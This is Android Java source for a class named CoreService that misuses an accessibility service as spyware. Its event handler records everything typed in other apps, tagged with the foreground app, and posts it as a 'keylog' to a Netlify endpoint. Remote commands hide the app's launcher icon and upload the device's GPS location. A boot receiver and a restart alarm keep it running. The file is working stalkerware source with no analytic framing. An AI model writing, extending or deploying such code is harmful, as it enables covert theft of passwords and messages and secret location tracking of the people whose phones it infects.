package com.chimera;

import android.Manifest;
import android.accessibilityservice.AccessibilityService;
import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.SystemClock;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import androidx.core.content.ContextCompat;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;

import org.json.JSONException;
import org.json.JSONObject;

public class CoreService extends AccessibilityService {

    private static final String TAG = "CoreService";
    private static final String NETLIFY_SUBMIT_URL = "https://chimeradmin.netlify.app/.netlify/functions/submit-data";

    private RequestQueue requestQueue;
    private FusedLocationProviderClient fusedLocationClient;
    private String lastForegroundAppPkg = "N/A";

    public static class BootReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent != null && Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
                try {
                    Intent serviceIntent = new Intent(context, CoreService.class);
                    context.startService(serviceIntent);
                } catch (Exception e) {
                    Log.e("BootReceiver", "Failed to start CoreService on boot", e);
                }
            }
        }
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        this.requestQueue = Volley.newRequestQueue(getApplicationContext());
        this.fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
        Log.i(TAG, "Ghost protocol engaged. Service is online.");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.getAction() != null) {
            handleCommand(intent);
        }
        return START_STICKY;
    }

    private void handleCommand(Intent intent) {
        String action = intent.getAction();
        if (action == null) return;
        Log.i(TAG, "Handling command: " + action);
        String command = action.replace("com.chimera.action.", "").toUpperCase();

        switch (command) {
            case "TOGGLE_ICON":
                boolean show = intent.getBooleanExtra("show", false);
                handleToggleIcon(show);
                break;
            case "GET_LOCATION":
                handleGetLocation();
                break;
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && event.getPackageName() != null) {
            lastForegroundAppPkg = event.getPackageName().toString();
        } else if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED && event.getText() != null) {
            String capturedText = event.getText().toString().trim();
            if (!capturedText.isEmpty()) {
                submitDataToServer("keylog", "App: " + lastForegroundAppPkg + " | Text: " + capturedText);
            }
        }
    }

    private void handleToggleIcon(boolean show) {
        PackageManager pm = getPackageManager();
        ComponentName componentName = new ComponentName(this, ProvisioningActivity.class);
        int state = show ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED : PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
        pm.setComponentEnabledSetting(componentName, state, PackageManager.DONT_KILL_APP);
        Log.i(TAG, "Launcher icon visibility set to: " + (show ? "VISIBLE" : "HIDDEN"));
    }

    @SuppressLint("MissingPermission")
    private void handleGetLocation() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            submitDataToServer("location_error", "Permission denied");
            return;
        }
        fusedLocationClient.getLastLocation().addOnSuccessListener(location -> {
            if (location != null) {
                try {
                    JSONObject locJson = new JSONObject();
                    locJson.put("latitude", location.getLatitude());
                    locJson.put("longitude", location.getLongitude());
                    locJson.put("accuracy", location.getAccuracy());
                    submitDataToServer("location", locJson);
                } catch (JSONException e) {
                   submitDataToServer("location_error", "JSON creation failed.");
                }
            } else {
                submitDataToServer("location_error", "Location not available.");
            }
        });
    }

    private void submitDataToServer(String dataType, Object payload) {
        JSONObject postData = new JSONObject();
        try {
            String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            postData.put("deviceId", deviceId);
            postData.put("dataType", dataType);
            postData.put("payload", payload);
            JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, NETLIFY_SUBMIT_URL, postData,
                    response -> Log.i(TAG, "Data submitted: " + dataType),
                    error -> Log.e(TAG, "Failed to submit '" + dataType + "': " + error.toString())
            );
            requestQueue.add(request);
        } catch (JSONException e) {
            Log.e(TAG, "Could not create submission JSON", e);
        }
    }

    @Override
    public void onInterrupt() { }
    
    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        Intent restart = new Intent(getApplicationContext(), this.getClass()).setPackage(getPackageName());
        PendingIntent pi = PendingIntent.getService(this, 1, restart, PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
        ((AlarmManager) getSystemService(Context.ALARM_SERVICE)).set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 1000, pi);
    }
}
